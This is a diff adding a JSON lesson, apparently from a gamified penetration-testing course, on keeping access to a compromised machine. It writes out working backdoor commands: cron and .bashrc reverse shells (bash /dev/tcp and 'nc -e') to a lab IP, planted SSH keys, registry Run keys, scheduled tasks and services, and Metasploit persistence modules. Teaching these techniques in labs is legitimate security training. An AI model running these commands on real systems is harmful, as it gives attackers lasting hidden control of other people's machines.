@@ -1,0 +1,79 @@
+{
+    "id": "l2",
+    "chapterId": "ch_11",
+    "title": "Maintaining Access: Persistence 🔗",
+    "description": "Learn to survive reboots and keep your foothold with backdoors and scheduled tasks.",
+    "xpReward": 40,
+    "estimatedMinutes": 12,
+    "section": "Persistence",
+    "slides": [
+        {
+            "id": "s_l2_1",
+            "type": "text",
+            "title": "Why Persistence? 💤",
+            "content": "# Don't Let the Shell Die\n\nA reverse shell is fragile. If the user logs off, the process crashes, or the machine reboots, you lose access. **Persistence** ensures your foothold survives.\n\n**Common Persistence Mechanisms:**\n- **Scheduled Tasks / Cron Jobs**: Execute payload at specific times or intervals.\n- **Startup Folders / Init Scripts**: Run payload when user logs in or system boots.\n- **Service Installation**: Install a malicious Windows service or Linux systemd unit.\n- **Registry Run Keys** (Windows): Execute payload on user login.\n- **SSH Keys / Authorized Keys**: Add your public key to `~/.ssh/authorized_keys`.\n- **Web Shells**: Leave a hidden PHP/ASPX file on the web server."
+        },
+        {
+            "id": "s_l2_2",
+            "type": "text",
+            "title": "Linux Persistence: Cron Jobs & SSH Keys 🐧",
+            "content": "# Classic Linux Backdoors\n\n**1. Cron Job (User Level)**\nAdd a line to the user's crontab that runs a reverse shell every 5 minutes.\n```bash\necho \"*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'\" | crontab -\n```\n\n**2. SSH Authorized Keys**\nIf SSH is open, generate a key pair on Kali and add the public key to the target's `authorized_keys`.\n```bash\n# On Kali\nssh-keygen -t rsa -f mykey\ncat mykey.pub\n\n# On Target\necho \"ssh-rsa AAAAB3NzaC...\" >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\n```\n\n**3. .bashrc / .profile Backdoor**\nAdd a command to the user's `.bashrc` that connects back when they open a terminal.\n```bash\necho \"nc -e /bin/bash 192.168.56.102 4444 &\" >> ~/.bashrc\n```"
+        },
+        {
+            "id": "s_l2_3",
+            "type": "quiz",
+            "title": "Linux Persistence 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l2_1",
+                "type": "multiple_choice",
+                "question": "You want a backdoor that triggers every time the user logs in via SSH and opens a terminal. Which file should you modify?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "/etc/passwd",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "~/.bashrc",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "/var/log/auth.log",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "/etc/crontab",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "`.bashrc` executes every time an interactive bash shell is started (e.g., SSH login).",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l2_4",
+            "type": "text",
+            "title": "Windows Persistence: Registry & Scheduled Tasks 🪟",
+            "content": "# Surviving on Windows\n\n**1. Registry Run Keys**\nThese keys execute programs when a user logs in.\n- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n- `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (requires admin)\n\n```cmd\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Updater\" /t REG_SZ /d \"C:\\Users\\Public\\backdoor.exe\" /f\n```\n\n**2. Scheduled Tasks**\nCreate a task that runs at logon or daily.\n```cmd\nschtasks /create /tn \"SystemUpdate\" /tr \"C:\\Users\\Public\\backdoor.exe\" /sc onlogon /ru SYSTEM\n```\n\n**3. Windows Service**\nIf you have admin privileges, create a malicious service.\n```cmd\nsc create \"WinUpdate\" binPath= \"C:\\Users\\Public\\backdoor.exe\" start= auto\nsc start \"WinUpdate\"\n```"
+        },
+        {
+            "id": "s_l2_5",
+            "type": "code",
+            "title": "Metasploit Persistence Modules 💻",
+            "content": "Metasploit automates many persistence methods via post-exploitation modules.",
+            "codeSnippet": "# In an active Meterpreter session, background it (Ctrl+Z)\n\n# Linux: Add user to sudoers or create cron\nuse post/linux/manage/persistence\nset SESSION 1\nrun\n\n# Windows: Registry persistence\nuse post/windows/manage/persistence_exe\nset SESSION 1\nset STARTUP USER\nrun\n\n# Windows: Create scheduled task\nuse exploit/windows/local/persistence\nset SESSION 1\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.56.102\nrun",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l2_6",
+            "type": "warning",
+            "title": "Persistence Detection 🛡️",
+            "content": "## Defenders Know These Tricks\n\nModern EDR (Endpoint Detection and Response) tools **actively monitor** Run Keys, Scheduled Tasks, and Service creation. In a real engagement, these techniques will likely trigger alerts unless heavily obfuscated. Use them in the lab, but know that in the wild, you need more sophisticated methods."
+        }
+    ]
+}
